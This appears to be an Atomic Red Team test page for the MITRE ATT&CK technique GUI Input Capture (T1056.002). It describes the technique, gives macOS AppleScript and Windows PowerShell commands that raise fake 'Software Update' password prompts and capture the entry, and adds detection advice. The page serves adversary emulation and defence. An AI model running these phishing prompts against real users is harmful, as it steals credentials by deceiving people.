# T1056.002 - Input Capture: GUI Input Capture
Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Access Control](https://attack.mitre.org/techniques/T1548/002)).

Adversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as AppleScript(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware) and PowerShell(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015). 

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - AppleScript - Prompt User for Password
Prompt User for Password (Local Phishing)
Reference: http://fuzzynop.blogspot.com/2014/10/osascript-for-local-phishing.html

**Supported Platforms:** macos
#### Attack Commands: Run with `bash`
```bash
osascript -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to display dialog "Software Update requires that you type your password to apply changes." & return & return  default answer "" with icon 1 with hidden answer with title "Software Update"'
```

Invoke-AtomicTest T1056.002 -TestNumbers 1

### Atomic Test #2 - PowerShell - Prompt User for Password
Prompt User for Password (Local Phishing) as seen in Stitch RAT. Upon execution, a window will appear for the user to enter their credentials.

Reference: https://github.com/nathanlopez/Stitch/blob/master/PyLib/askpass.py

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
# Creates GUI to prompt for password. Expect long pause before prompt is available.    
$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName)
# Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.
write-warning $cred.GetNetworkCredential().Password
```

Invoke-AtomicTest T1056.002 -TestNumbers 2

## Detection
Monitor process execution for unusual programs as well as malicious instances of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) that could be used to prompt users for credentials.

Inspect and scrutinize input prompts for indicators of illegitimacy, such as non-traditional banners, text, timing, and/or sources.